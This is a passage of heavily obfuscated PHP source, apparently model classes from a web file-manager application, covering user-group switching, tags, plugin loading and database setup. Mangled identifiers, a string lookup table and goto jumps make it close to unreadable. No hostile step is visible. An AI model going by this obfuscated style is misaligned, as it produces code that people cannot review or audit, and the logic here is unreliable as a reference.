0; $c—…§¥ÎÓ = $cìõŒšŠƒ[47] . implode($cìõŒšŠƒ[47], array_reverse($c—…§¥ÎÓ)) . $cìõŒšŠƒ[47]; $this->setNamePinyin($AÔµ¯Ê™Ò×[$C•¨¯‘ª‚—], $AÔµ¯Ê™Ò×[$cìõŒšŠƒ[28]]); goto Då¸êçÖ; Eè‰ÎÌ‘œ: } return $B™¨×âº°; } public function groupNameAuto($DÔàÁ‘‡¦, $fßñÀ¾ÂëÊ) { $f¿Ş®Š£À =& $_SERVER[›èö’ù¤]; $f‚ÉÖ¬…­ = $this->where(array($f¿Ş®Š£À[396] => $DÔàÁ‘‡¦))->getField($f¿Ş®Š£À[28], !0); if (!$f‚ÉÖ¬…­ || !in_array($fßñÀ¾ÂëÊ, $f‚ÉÖ¬…­)) { return $fßñÀ¾ÂëÊ; } for ($D°šÀ´¥Ê” = 1; $D°šÀ´¥Ê” <= count($f‚ÉÖ¬…­) + 1; $D°šÀ´¥Ê”++) { $c³óñãîæ¶ = $fßñÀ¾ÂëÊ . "\x28{$D°šÀ´¥Ê”}\51"; if (!in_array($c³óñãîæ¶, $f‚ÉÖ¬…­)) { return $c³óñãîæ¶; } } } public function groupSwitch($Bï˜Œ”‡†˜, $Bí‚•Ù£ Ş) { goto C¼ğçƒğä›; eîÜŞ‚Îº˜: $BôŠ ÄĞ¦‡ = !empty($a¦Å¥›§Àï[$Bï˜Œ”‡†˜]) ? $a¦Å¥›§Àï[$Bï˜Œ”‡†˜] : !1; if ($BôŠ ÄĞ¦‡) { goto d¢›øÂï•¾; d¢›øÂï•¾: if (!$a¦Å¥›§Àï[$Bí‚•Ù£ Ş]) { $a¦Å¥›§Àï[$Bí‚•Ù£ Ş] = Model($B±è­Õç™¡[816])->groupRootAdd($Bí‚•Ù£ Ş); } $DÏÛ¸˜Ş¦ = $a¦Å¥›§Àï[$Bí‚•Ù£ Ş]; $bñ‡•òä• = array($B±è­Õç™¡[493] => $BôŠ ÄĞ¦‡); goto C™—¨›¢Ö; dÑ™Éó˜Ë‡: foreach ($a¦Å¥›§Àï as $c¬ß‘ ã) { $D‘Ñ¯îÚÏ© = $c¬ß‘ ã[$B±è­Õç™¡[405]] == $B±è­Õç™¡[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($B±è­Õç™¡[816])->move($c¬ß‘ ã[$B±è­Õç™¡[397]], $DÏÛ¸˜Ş¦, $D‘Ñ¯îÚÏ©); } Model($B±è­Õç™¡[816])->moveClearAuth = !0; $bñ‡•òä• = array($B±è­Õç™¡[406] => 2, $B±è­Õç™¡[499] => $Bï˜Œ”‡†˜); goto FŞ£ ¯¡ø°; FŞ£ ¯¡ø°: $D­×°„Å—Ş = array($B±è­Õç™¡[499] => $Bí‚•Ù£ Ş); Model($B±è­Õç™¡[1823])->where($bñ‡•òä•)->save($D­×°„Å—Ş); Model($B±è­Õç™¡[1824])->where($bñ‡•òä•)->save($D­×°„Å—Ş); goto B¡‰©¶„ÌÉ; C™—¨›¢Ö: $a¦Å¥›§Àï = Model($B±è­Õç™¡[816])->where($bñ‡•òä•)->field($B±è­Õç™¡[1822])->select(); if (!$a¦Å¥›§Àï) { $a¦Å¥›§Àï = array(); } Model($B±è­Õç™¡[816])->moveClearAuth = !1; goto dÑ™Éó˜Ë‡; B¡‰©¶„ÌÉ: } $this->_changeChildLevel($dÔˆ†ËØÎ–[$Bï˜Œ”‡†˜], $dÔˆ†ËØÎ–[$Bí‚•Ù£ Ş], !0); goto AÈ×ÏõĞ; C¼ğçƒğä›: $B±è­Õç™¡ =& $_SERVER[›èö’ù¤]; $bñ‡•òä• = array($B±è­Õç™¡[1720] => array($B±è­Õç™¡[7], array($Bï˜Œ”‡†˜, $Bí‚•Ù£ Ş))); $dÔˆ†ËØÎ– = $this->where($bñ‡•òä•)->select(); goto d„µù˜Ñ—“; AÈ×ÏõĞ: $this->where(array($B±è­Õç™¡[493] => $Bï˜Œ”‡†˜))->save(array($B±è­Õç™¡[493] => $Bí‚•Ù£ Ş)); $this->_clearChildrenCache($dÔˆ†ËØÎ–[$Bí‚•Ù£ Ş]); return !0; goto D™Úå¡ßœ‚; C‚·ƒ•êìŸ: $b‡í®âõßğ = Model($B±è­Õç™¡[1806])->where($bñ‡•òä•)->select(); if (!$b‡í®âõßğ) { $b‡í®âõßğ = array(); } foreach ($b‡í®âõßğ as $cÛØ·³ª¦) { $d½³ÂÆÃ’à = $cÛØ·³ª¦[$B±è­Õç™¡[1551]]; $bñ‡•òä• = array($B±è­Õç™¡[1551] => $d½³ÂÆÃ’à, $B±è­Õç™¡[1720] => $Bí‚•Ù£ Ş); $f–Î×ô³ë = Model($B±è­Õç™¡[1806])->where($bñ‡•òä•)->find(); if (!$f–Î×ô³ë) { $fÜ‡Ş‡â¦° = array($Bí‚•Ù£ Ş => $cÛØ·³ª¦[$B±è­Õç™¡[1820]]); Model($B±è­Õç™¡[533])->userGroupAdd($d½³ÂÆÃ’à, $fÜ‡Ş‡â¦°); } Model($B±è­Õç™¡[533])->userGroupRemove($d½³ÂÆÃ’à, $Bï˜Œ”‡†˜); } goto fïšÍËÇè’; fïšÍËÇè’: $bñ‡•òä• = array($B±è­Õç™¡[406] => 2, $B±è­Õç™¡[493] => 0, $B±è­Õç™¡[405] => 1, $B±è­Õç™¡[499] => array($B±è­Õç™¡[7], array($Bï˜Œ”‡†˜, $Bí‚•Ù£ Ş))); $a¦Å¥›§Àï = Model($B±è­Õç™¡[816])->where($bñ‡•òä•)->field($B±è­Õç™¡[1821])->select(); $a¦Å¥›§Àï = array_to_keyvalue($a¦Å¥›§Àï, $B±è­Õç™¡[499], $B±è­Õç™¡[397]); goto eîÜŞ‚Îº˜; d„µù˜Ñ—“: $dÔˆ†ËØÎ– = array_to_keyvalue($dÔˆ†ËØÎ–, $B±è­Õç™¡[1720]); if (!isset($dÔˆ†ËØÎ–[$Bï˜Œ”‡†˜]) || !isset($dÔˆ†ËØÎ–[$Bí‚•Ù£ Ş]) || $dÔˆ†ËØÎ–[$Bï˜Œ”‡†˜][$B±è­Õç™¡[493]] == 0) { return !1; } $bñ‡•òä• = array($B±è­Õç™¡[1720] => $Bï˜Œ”‡†˜); goto C‚·ƒ•êìŸ; D™Úå¡ßœ‚: } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($DÒ´Û·±ì…) { $c§Ñ¥„¥¥ß =& $_SERVER[›èö’ù¤]; return array($c§Ñ¥„¥¥ß[1825] => array($DÒ´Û·±ì…[0], $c§Ñ¥„¥¥ß[1826]), $c§Ñ¥„¥¥ß[1827] => array($DÒ´Û·±ì…[0], $c§Ñ¥„¥¥ß[1828])); } protected function get($Eªñ±Ùõê¶) { $e×ÓŠŸˆ¡ö =& $_SERVER[›èö’ù¤]; $eŸ£õÄÕÑË = Model($e×ÓŠŸˆ¡ö[517])->metaGet($Eªñ±Ùõê¶, $e×ÓŠŸˆ¡ö[1829]); $D­â¬Œ»¬‘ = json_decode($eŸ£õÄÕÑË, !0); return $D­â¬Œ»¬‘ ? $D­â¬Œ»¬‘ : array($e×ÓŠŸˆ¡ö[1830] => $e×ÓŠŸˆ¡ö[87], $e×ÓŠŸˆ¡ö[367] => array()); } protected function set($bÇ±‹¥¿, $B‘Şİ©’š) { $cäÉ„ˆ•ë¾ =& $_SERVER[›èö’ù¤]; $B‘Şİ©’š = $B‘Şİ©’š ? $B‘Şİ©’š : array($cäÉ„ˆ•ë¾[1830] => $cäÉ„ˆ•ë¾[87], $cäÉ„ˆ•ë¾[367] => array()); Model($cäÉ„ˆ•ë¾[517])->metaSet($bÇ±‹¥¿, $cäÉ„ˆ•ë¾[1829], json_encode($B‘Şİ©’š)); return Model($cäÉ„ˆ•ë¾[517])->metaSet($bÇ±‹¥¿, $cäÉ„ˆ•ë¾[1829], json_encode($B‘Şİ©’š)); } protected function getByTagID($dÂ¨Êè«Ã, $A§Ÿ”òğ†Ê) { goto A˜«“ÆØ©…; A˜«“ÆØ©…: $eÉØ««Öší =& $_SERVER[›èö’ù¤]; if (!$dÂ¨Êè«Ã || !$A§Ÿ”òğ†Ê) { return !1; } if (!Model($eÉØ««Öší[517])->getInfoSimple($dÂ¨Êè«Ã)) { return !1; } goto cèóŸè®ÒË; DÎÏÀÉ£Ò: return is_array($bšì¤ö²Àá) ? $bšì¤ö²Àá : !1; goto cğ¹±œ„íì; cèóŸè®ÒË: $c¹©ÓİÜ¨« = $this->get($dÂ¨Êè«Ã); if (!$c¹©ÓİÜ¨« || !isset($c¹©ÓİÜ¨«[$eÉØ««Öší[367]])) { return !1; } $bšì¤ö²Àá = array_find_by_field($c¹©ÓİÜ¨«[$eÉØ««Öší[367]], $eÉØ««Öší[395], $A§Ÿ”òğ†Ê); goto DÎÏÀÉ£Ò; cğ¹±œ„íì: } public function listSource($føÜ¹ÁášÑ, $F®äî¹„±Ë) { goto Aå´ğ´ì”Ò; eÔàØç¡ÙË: foreach ($C÷—†Å as $d¾æ î¶À›) { if (!in_array($d¾æ î¶À›, $bÕÅ‡ŒöÙâ)) { $E¬šŞÖÖå[] = $d¾æ î¶À›; } } if ($E¬šŞÖÖå) { $this->removeBySource($føÜ¹ÁášÑ, $E¬šŞÖÖå); } return $F•™Ô„›ç¯; goto eğ¾Ø«—; cŠê“áÎà: $a¨ğÈÛ‰„¸ = array(); foreach ($C«ˆÇçùØ² as $AÑã»Â Ô) { $d¾æ î¶À› = $AÑã»Â Ô[$Aº“„„†Ç°[76]]; if (!$d¾æ î¶À›) { continue; } if (!isset($a¨ğÈÛ‰„¸[$d¾æ î¶À›])) { $a¨ğÈÛ‰„¸[$d¾æ î¶À›] = array(); } $a¨ğÈÛ‰„¸[$d¾æ î¶À›][] = $AÑã»Â Ô[$Aº“„„†Ç°[421]]; } $C÷—†Å = array(); goto fªğµŒ„—; Aå´ğ´ì”Ò: $Aº“„„†Ç° =& $_SERVER[›èö’ù¤]; if ($F®äî¹„±Ë && !is_array($F®äî¹„±Ë)) { $F®äî¹„±Ë = array($F®äî¹„±Ë); } $C«ˆÇçùØ² = $this->listData($føÜ¹ÁášÑ); goto cŠê“áÎà; fªğµŒ„—: foreach ($a¨ğÈÛ‰„¸ as $Eíš¡«Ë‹ˆ => $A‘×ÓÆÇö) { $fÈÍ¯ôñ†ñ = !0; if (!$F®äî¹„±Ë) { $C÷—†Å[] = $Eíš¡«Ë‹ˆ; continue; } foreach ($F®äî¹„±Ë as $eíÅ÷¥ïÒ) { if (!in_array($eíÅ÷¥ïÒ, $A‘×ÓÆÇö)) { $fÈÍ¯ôñ†ñ = !1; break; } } if ($fÈÍ¯ôñ†ñ) { $C÷—†Å[] = $Eíš¡«Ë‹ˆ; } } if (!$C÷—†Å) { return array(); } $aôõÊ†·àù = array($Aº“„„†Ç°[412] => array($Aº“„„†Ç°[413], $C÷—†Å), $Aº“„„†Ç°[499] => $føÜ¹ÁášÑ, $Aº“„„†Ç°[406] => SourceModel::TYPE_GROUP); goto F®îïÆñÂÌ; F®îïÆñÂÌ: $F•™Ô„›ç¯ = Model($Aº“„„†Ç°[1230])->listSource($aôõÊ†·àù); if (!$F•™Ô„›ç¯ || count($C÷—†Å) == $F•™Ô„›ç¯[$Aº“„„†Ç°[364]][$Aº“„„†Ç°[365]]) { return $F•™Ô„›ç¯; } $E¬šŞÖÖå = array(); goto C­ŞÚÆ‘‚ˆ; C­ŞÚÆ‘‚ˆ: $cø¿æ‚Í´É = array_to_keyvalue($F•™Ô„›ç¯[$Aº“„„†Ç°[75]], $Aº“„„†Ç°[33], $Aº“„„†Ç°[397]); $C³åÓÒ = array_to_keyvalue($F•™Ô„›ç¯[$Aº“„„†Ç°[74]], $Aº“„„†Ç°[33], $Aº“„„†Ç°[397]); $bÕÅ‡ŒöÙâ = array_merge($C³åÓÒ, $cø¿æ‚Í´É); goto eÔàØç¡ÙË; eğ¾Ø«—: } protected function listData($d•ˆ·“”) { $aë‘«’È“ó =& $_SERVER[›èö’ù¤]; $cÓŞ…¡³•ç = array($aë‘«’È“ó[1542] => 0, $aë‘«’È“ó[478] => array($aë‘«’È“ó[1831], 0), $aë‘«’È“ó[417] => $aë‘«’È“ó[1832] . $d•ˆ·“”); $FëË•™åÚÆ = $aë‘«’È“ó[1833]; $d–íê¡ïö = $this->field($FëË•™åÚÆ)->where($cÓŞ…¡³•ç)->order($aë‘«’È“ó[1834])->select(); return $d–íê¡ïö ? $d–íê¡ïö : array(); } protected function addToTag($b§áƒà‰‡, $cŒØõÌŒ¢Ç, $e›¿…Œçµ) { $C±«­±ö…È =& $_SERVER[›èö’ù¤]; if (!$this->getByTagID($b§áƒà‰‡, $e›¿…Œçµ) || !$cŒØõÌŒ¢Ç) { return !1; } if (!Model($C±«­±ö…È[816])->pathInfo($cŒØõÌŒ¢Ç)) { return !1; } $FÕŒâçÂ®Ğ = array($C±«­±ö…È[1542] => 0, $C±«­±ö…È[478] => $e›¿…Œçµ, $C±«­±ö…È[416] => $cŒØõÌŒ¢Ç, $C±«­±ö…È[417] => $C±«­±ö…È[1835] . $b§áƒà‰‡, $C±«­±ö…È[415] => $C±«­±ö…È[33], $C±«­±ö…È[1724] => 0); if ($this->where($FÕŒâçÂ®Ğ)->find()) { return !1; } return $this->add($FÕŒâçÂ®Ğ); } protected function removeFromTag($f•‚×ñ¬—Æ, $C³©¹Ş®õÊ, $Bë“±§Ä°£) { $e…ø­ª·àÏ =& $_SERVER[›èö’ù¤]; if (!$this->getByTagID($f•‚×ñ¬—Æ, $Bë“±§Ä°£) || !$C³©¹Ş®õÊ) { return !1; } if (is_array($C³©¹Ş®õÊ)) { $C³©¹Ş®õÊ = array($e…ø­ª·àÏ[7], $C³©¹Ş®õÊ); } $BÏ’ŸÇ»»‰ = array($e…ø­ª·àÏ[1542] => 0, $e…ø­ª·àÏ[478] => $Bë“±§Ä°£, $e…ø­ª·àÏ[417] => $e…ø­ª·àÏ[1835] . $f•‚×ñ¬—Æ, $e…ø­ª·àÏ[416] => $C³©¹Ş®õÊ); return $this->where($BÏ’ŸÇ»»‰)->delete(); } protected function removeByTag($cµ„‡„¥À, $cî¦¬ÆµøÑ) { $C¥İ‹™¦‘‹ =& $_SERVER[›èö’ù¤]; if (!$this->getByTagID($cµ„‡„¥À, $cî¦¬ÆµøÑ)) { return !1; } $fäÙô†ÚÉ = array($C¥İ‹™¦‘‹[1542] => 0, $C¥İ‹™¦‘‹[478] => $cî¦¬ÆµøÑ, $C¥İ‹™¦‘‹[417] => $C¥İ‹™¦‘‹[1835] . $cµ„‡„¥À); return $this->where($fäÙô†ÚÉ)->delete(); } protected function removeBySource($FÌ©‚÷©ôŒ, $C•Å”ÆÉÏâ) { $A¸©öÉÏŸ„ =& $_SERVER[›èö’ù¤]; if (!$FÌ©‚÷©ôŒ || !$C•Å”ÆÉÏâ) { return !1; } if (is_array($C•Å”ÆÉÏâ)) { $C•Å”ÆÉÏâ = array($A¸©öÉÏŸ„[7], $C•Å”ÆÉÏâ); } $e¦Ï©ƒÍÔ‹ = array($A¸©öÉÏŸ„[1542] => 0, $A¸©öÉÏŸ„[416] => $C•Å”ÆÉÏâ, $A¸©öÉÏŸ„[478] => array($A¸©öÉÏŸ„[997], 0), $A¸©öÉÏŸ„[417] => $A¸©öÉÏŸ„[1835] . $FÌ©‚÷©ôŒ); return $this->where($e¦Ï©ƒÍÔ‹)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x70\x6c\165\147\x69\156\x4c\x69\163\164"; public $field = array("\156\141\155\145", "\x73\x74\141\164\165\x73", "\x72\145\x67\151\145\163\x74", "\143\157\x6e\146\x69\147"); public function loadList($cÃ˜ËöŞá = false) { $c ‰«´Öö = array_to_keyvalue($this->listData(), $_SERVER[›èö’ù¤][28]); if ($cÃ˜ËöŞá) { return $c ‰«´Öö[$cÃ˜ËöŞá]; } return $c ‰«´Öö; } public function init() { $C¯¶ÑÎ‰„º =& $_SERVER[›èö’ù¤]; Hook::trigger($C¯¶ÑÎ‰„º[1836]); $Eà¡øä»«× = $this->loadPluginList(); foreach ($Eà¡øä»«× as $BÉöƒĞ¥Üœ => $D¯¬ÇÑ¿‚) { $d”ƒï¥Šæä = $this->appAllow($BÉöƒĞ¥Üœ, $D¯¬ÇÑ¿‚); if (!$d”ƒï¥Šæä) { continue; } foreach ($D¯¬ÇÑ¿‚[$C¯¶ÑÎ‰„º[1837]] as $Bí¯«º ‡Ç => $A‚’äÔ‘Ì) { Hook::bind($Bí¯«º ‡Ç, $A‚’äÔ‘Ì); } } Hook::trigger($C¯¶ÑÎ‰„º[1838]); Hook::trigger(ACTION); } public function appAllow($f æ†á«, $BªÌ¼Ğñ¿, $Aº¬æ¤¤ó = true) { $CÇŞâ«™¢È =& $_SERVER[›èö’ù¤]; $Eƒ’ò‘¹Ê‰ = PLUGIN_DIR . $f æ†á« . $CÇŞâ«™¢È[1839]; if (!is_array($BªÌ¼Ğñ¿) || !is_array($BªÌ¼Ğñ¿[$CÇŞâ«™¢È[1837]]) || $BªÌ¼Ğñ¿[$CÇŞâ«™¢È[734]] != 1 || !is_file($Eƒ’ò‘¹Ê‰)) { return !1; } if ($GLOBALS[$CÇŞâ«™¢È[500]] == 1) { return !0; } if ($Aº¬æ¤¤ó && !Action($CÇŞâ«™¢È[1840])->checkAuth($f æ†á«)) { return !1; } return !0; } public function unInstall($aŞïªç¿…á) { $b‚ê«Œé“Í =& $_SERVER[›èö’ù¤]; $D¡ŞšÎª = $this->loadList($aŞïªç¿…á); if (file_exists(PLUGIN_DIR . $aŞïªç¿…á)) { Hook::apply($aŞïªç¿…á . $b‚ê«Œé“Í[1841]); } $this->remove($D¡ŞšÎª[$b‚ê«Œé“Í[395]]); } public function changeStatus($c¦å–¼†åß, $b¿¾Ğ§ÑÏß) { $bÖ«»Ìâø† =& $_SERVER[›èö’ù¤]; $cæóÛŒ¶‘ = $this->loadList($c¦å–¼†åß); if ($b¿¾Ğ§ÑÏß) { Hook::apply($c¦å–¼†åß . $bÖ«»Ìâø†[1842]); } $this->update($cæóÛŒ¶‘[$bÖ«»Ìâø†[395]], array($bÖ«»Ìâø†[1843] => $b¿¾Ğ§ÑÏß)); } public function appRegist($a¨™œÀ„Œ¢, $d×ñòœáæÎ) { $Cß§°ÔÊ¥ =& $_SERVER[›èö’ù¤]; $c“‰éÈÓ†Ú = $this->loadList($a¨™œÀ„Œ¢); if ($c“‰éÈÓ†Ú) { $this->update($c“‰éÈÓ†Ú[$Cß§°ÔÊ¥[395]], array($Cß§°ÔÊ¥[1837] => $d×ñòœáæÎ)); } else { $b‹‰ÍÎÖ©ã = array($Cß§°ÔÊ¥[28] => $a¨™œÀ„Œ¢, $Cß§°ÔÊ¥[1837] => $d×ñòœáæÎ, $Cß§°ÔÊ¥[734] => 0, $Cß§°ÔÊ¥[6] => $this->getConfigDefault($a¨™œÀ„Œ¢)); $this->insert($b‹‰ÍÎÖ©ã); } } public function getConfigDefault($AÈ§Ì½©¾) { $F±‹‚ƒ”êÎ =& $_SERVER[›èö’ù¤]; $f²‰Œ…œ« = array(); $a©ˆçÑÈ = $this->getPackageJson($AÈ§Ì½©¾); if (!$a©ˆçÑÈ && is_array($a©ˆçÑÈ[$F±‹‚ƒ”êÎ[1844]])) { return $f²‰Œ…œ«; } foreach ($a©ˆçÑÈ[$F±‹‚ƒ”êÎ[1844]] as $a¦Æç© éĞ => $cÏœ×¸óÇ‰) { if (!isset($cÏœ×¸óÇ‰[$F±‹‚ƒ”êÎ[372]]) || isset($f²‰Œ…œ«[$a¦Æç© éĞ])) { continue; } $f²‰Œ…œ«[$a¦Æç© éĞ] = $cÏœ×¸óÇ‰[$F±‹‚ƒ”êÎ[372]]; } return $f²‰Œ…œ«; } public function getPackageJson($A»œØÎîŸ®) { return Hook::apply($A»œØÎîŸ® . $_SERVER[›èö’ù¤][1845]); } public function getConfig($e´À˜Î Œ, $bíŒ¢øôµ = false) { $E»±¢š…±ç =& $_SERVER[›èö’ù¤]; $E ‹Î¨ÇÁ = array(); $FŒ˜ëĞ‰óÄ = $this->loadList($e´À˜Î Œ); if ($FŒ˜ëĞ‰óÄ && is_array($FŒ˜ëĞ‰óÄ[$E»±¢š…±ç[6]])) { $E ‹Î¨ÇÁ = $FŒ˜ëĞ‰óÄ[$E»±¢š…±ç[6]]; } if (!$E ‹Î¨ÇÁ || $bíŒ¢øôµ) { $E ‹Î¨ÇÁ = $this->getConfigDefault($e´À˜Î Œ); } return $E ‹Î¨ÇÁ; } public function setConfig($A‹ÂÅÂ“ìõ, $FéÌ—†õ÷… = false) { goto a”‹ß—ëå²; a”‹ß—ëå²: $eİøŠœÃË =& $_SERVER[›èö’ù¤]; $Aõ”ßˆ–¨Ì = $this->loadList($A‹ÂÅÂ“ìõ); if (!$Aõ”ßˆ–¨Ì) { return !1; } goto B•™ˆö†ŸÕ; cÛÎ•ï: $this->update($Aõ”ßˆ–¨Ì[$eİøŠœÃË[395]], array($eİøŠœÃË[6] => $dêæ…ê§¯)); goto fñÒá“…•ò; B•™ˆö†ŸÕ: $dêæ…ê§¯ = $Aõ”ßˆ–¨Ì[$eİøŠœÃË[6]]; if ($FéÌ—†õ÷… == !1) { $dêæ…ê§¯ = array(); $FéÌ—†õ÷… = $this->getConfigDefault($A‹ÂÅÂ“ìõ); } foreach ($FéÌ—†õ÷… as $aÔŒè…±„ => $AŒÌ¥öËç„) { $dêæ…ê§¯[$aÔŒè…±„] = is_string($AŒÌ¥öËç„) ? trim($AŒÌ¥öËç„) : $AŒÌ¥öËç„; } goto cÛÎ•ï; fñÒá“…•ò: } public function viewList() { goto Cï°òÌÔÊ; A‘ÛóÚ¨¥ó: $A×¤ÁÆö = $this->loadPluginList(); $A¦İ’«”¼Ğ = array(); foreach ($A×¤ÁÆö as $CÎÆº´ö¨ˆ => $C±ÁŞÜÙî¶) { unset($C±ÁŞÜÙî¶[$Bµî½êƒŒ´[1837]], $C±ÁŞÜÙî¶[$Bµî½êƒŒ´[6]]); $fò‚¡° ØÈ = PLUGIN_DIR . $C±ÁŞÜÙî¶[$Bµî½êƒŒ´[28]] . $Bµî½êƒŒ´[1839]; if (!is_file($fò‚¡° ØÈ)) { continue; } $BáŸä™’Á = Hook::apply($C±ÁŞÜÙî¶[$Bµî½êƒŒ´[28]] . $Bµî½êƒŒ´[1845]); if (is_array($BáŸä™’Á)) { $A¦İ’«”¼Ğ[$CÎÆº´ö¨ˆ] = array_merge($C±ÁŞÜÙî¶, $BáŸä™’Á); } } goto A³†²‚èâµ; A³†²‚èâµ: return $A¦İ’«”¼Ğ; goto EÆµßÛ÷İ†; Cï°òÌÔÊ: $Bµî½êƒŒ´ =& $_SERVER[›èö’ù¤]; $A×¤ÁÆö = $this->loadList(); $this->pluginScan($A×¤ÁÆö); goto A‘ÛóÚ¨¥ó; EÆµßÛ÷İ†: } private function loadPluginList() { $cãõæÉŒ‹­ =& $_SERVER[›èö’ù¤]; $EŞØ„¶Ò¶Â = $this->loadList(); if (strtolower(MOD) == $cãõæÉŒ‹­[1846]) { return $EŞØ„¶Ò¶Â; } $aŠˆŒ¹İÕ¾ = Hook::trigger($cãõæÉŒ‹­[1847], $EŞØ„¶Ò¶Â); if ($EŞØ„¶Ò¶Â && !$aŠˆŒ¹İÕ¾) { die; } return $aŠˆŒ¹İÕ¾ ? $aŠˆŒ¹İÕ¾ : $EŞØ„¶Ò¶Â; } private function pluginScan($cá¼†Í÷Õ×) { $bğÀ íÚºÌ =& $_SERVER[›èö’ù¤]; recursion_dir(PLUGIN_DIR, $DøãØÚÖ‘¶, $c¯ÉÏ÷ó½Á, 0); foreach ($DøãØÚÖ‘¶ as $CÚ”ñ“½²») { $CÔÙèÀÃè¨ = get_path_this($CÚ”ñ“½²»); if (isset($cá¼†Í÷Õ×[$CÔÙèÀÃè¨]) || !file_exists($CÚ”ñ“½²» . $bğÀ íÚºÌ[1848]) || !file_exists($CÚ”ñ“½²» . $bğÀ íÚºÌ[1839])) { continue; } Hook::apply($CÔÙèÀÃè¨ . $bğÀ íÚºÌ[1842]); } } } goto aÙ¸¾à…Ä; Fƒ ÆŠë“ñ: class DbManage { function __construct($E„¢Ğ™ƒƒ, $AÕİ£Ã–©÷ = '') { $this->database = $E„¢Ğ™ƒƒ; $this->type = $AÕİ£Ã–©÷; } public function model($A°š‹„ñ–® = '') { return new ModelBase($A°š‹„ñ–®, $_SERVER[›èö’ù¤][33], $this->database); } public function db($DöÃÔğÏ£ = false) { goto eÑÂ¬¬à³¾; Aç»ŒÆÑ°î: $d³¬„ßî¾™ = $D¤Á½ùì Ó[$B„ƒ¦é¡†[955]]; $D¤Á½ùì Ó[$B„ƒ¦é¡†[955]] = $B„ƒ¦é¡†[33]; if ($D¤Á½ùì Ó[$B„ƒ¦é¡†[780]] == $B„ƒ¦é¡†[781]) { $aŸ¶‰é¨‚ = $D¤Á½ùì Ó[$B„ƒ¦é¡†[782]]; $D¤Á½ùì Ó[$B„ƒ¦é¡†[782]] = substr($aŸ¶‰é¨‚, 0, strrpos($aŸ¶‰é¨‚, $B„ƒ¦é¡†[1042])); } goto AÇ™öáÑİÏ; eÑÂ¬¬à³¾: $B„ƒ¦é¡† =& $_SERVER[›èö’ù¤]; $D¤Á½ùì Ó = array_change_key_case($this->database); if ($this->type == $B„ƒ¦é¡†[9] || !$DöÃÔğÏ£) { return $this->model()->db(); } goto Aç»ŒÆÑ°î; E¨¡’¡•»‡: $this->database = $D¤Á½ùì Ó; $dË‰Ä¿±†½->execute("\165\163\x65\x20\x60{$d³¬„ßî¾™}\x60"); return $dË‰Ä¿±†½; goto aÙˆõ‚—ãÜ; AÇ™öáÑİÏ: $this->database = $D¤Á½ùì Ó; $dË‰Ä¿±†½ = $this->model()->db(); try { $a”ß‹­ô“ = $dË‰Ä¿±†½->execute("\x73\x68\x6f\x77\40\x64\x61\164\141\142\x61\163\145\x73\40\154\151\x6b\x65\40\x27{$d³¬„ßî¾™}\47"); } catch (Exception $EŞº˜¨‹îË) { } goto d•Š³á‡²ä; d•Š³á‡²ä: if (!$a”ß‹­ô“) { $dË‰Ä¿±†½->execute("\143\162\145\141\164\145\40\144\x61\x74\x61\142\x61\x73\145\40\x60{$d³¬„ßî¾™}\x60"); } $D¤Á½ùì Ó[$B„ƒ¦é¡†[955]] = $d³¬„ßî¾™; if ($D¤Á½ùì Ó[$B„ƒ¦é¡†[780]] == $B„ƒ¦é¡†[781]) { $D¤Á½ùì Ó[$B„ƒ¦é¡†[782]] .= $B„ƒ¦é¡†[1042] . $d³¬„ßî¾™; } goto E¨¡’¡•»‡; aÙˆõ‚—ãÜ: } public function createTable($B›»ãò”â÷, $eâ÷§²Ë® = null) { $b…í¬á½¤• =& $_SERVER[›èö’ù¤]; if (!IO::exist($B›»ãò”â÷)) { ActionCall($b…í¬á½¤•[1043], !0, 0); show_json(LNG($b…í¬á½¤•[1044]), !1); } $a‹¯İ×î†  = sqlSplit(IO::getContent($B›»ãò”â÷)); foreach ($a‹¯İ×î†  as $fôïé·­…) { if ($eâ÷§²Ë®) { $C…Æõìİ¶ = stripos($fôïé·­…, $b…í¬á½¤•[1045]) === 0; if ($C…Æõìİ¶) { $eâ÷§²Ë®->task[$b…í¬á½¤•[1046]] += 1; } } $this->model()->db()->execute($fôïé·­…); if ($eâ÷§²Ë® && $C…Æõìİ¶) { preg_match($b…í¬á½¤•[1047], $fôïé·­…, $C´ùÜÒ¢Ó); $eâ÷§²Ë®->task[$b…í¬á½¤•[1048]] = $C´ùÜÒ¢Ó[1]; $eâ÷§²Ë®->update(1); } } $this->taskToCache($eâ÷§²Ë®); } public function insertTable($fŠ£’Ì”‹, $fšô˜éë¼Ô = null) { $Fé‹Õé½º¼ =& $_SERVER[›èö’ù¤]; $f…¹—£½ê¿ = $this->model()->db(); $d‚ˆ÷ê¨ = $Fä¢Û©õÙÂ ? array($Fä¢Û©õÙÂ) : $f…¹—£½ê¿->getTables(); foreach ($fŠ£’Ì”‹ as $CğŒŸõÍ¤½) { $Fä¢Û©õÙÂ = basename($CğŒŸõÍ¤½, $Fé‹Õé½º¼[770]); if (!in_array($Fä¢Û©õÙÂ, $d‚ˆ÷ê¨)) { continue; } if ($fšô˜éë¼Ô) { $fšô˜éë¼Ô->task[$Fé‹Õé½º¼[1048]] = $Fä¢Û©õÙÂ; } if (get_filesize($CğŒŸõÍ¤½) == 0) { continue; } $cùë©†Õí„ = $this->sqlToDb($CğŒŸõÍ¤½, $fšô˜éë¼Ô); if (!$cùë©†Õí„) { ActionCall($Fé‹Õé½º¼[1043], !0, 0); show_json(LNG($Fé‹Õé½º¼[1049]) . "\x5b{$Fä¢Û©õÙÂ}\135", !1); } } $this->taskToCache($fšô˜éë¼Ô); } public function sqlFromDb($A†ËÄ¼®¬, $Aµ«–Õàç, $d­Î¼ÑÕº‚ = null, $fòá¥¹±ë = null) { goto A§¡¹´Ôç; añË×‚ã…ç: fclose($AçäÏ¹âë); return $aã¨Ä¯‡Ù; goto CÌÌ´‹…¡è; cƒß†”Î•Ö: $Eò³‘§Ç = 0; $cé æ¿ = 10000; $AçäÏ¹âë = fopen($Aµ«–Õàç, $_SERVER[›èö’ù¤][1050]); goto DİÎæÂ©¦ˆ; A§¡¹´Ôç: if ($d­Î¼ÑÕº‚) { $d­Î¼ÑÕº‚->task[$_SERVER[›èö’ù¤][1048]] = $A†ËÄ¼®¬; } $B›Ç’ä”ÖÉ = $this->model($A†ËÄ¼®¬); $aã¨Ä¯‡Ù = 0; goto cƒß†”Î•Ö; DİÎæÂ©¦ˆ: $F¬¾‘Š¸ØÜ = 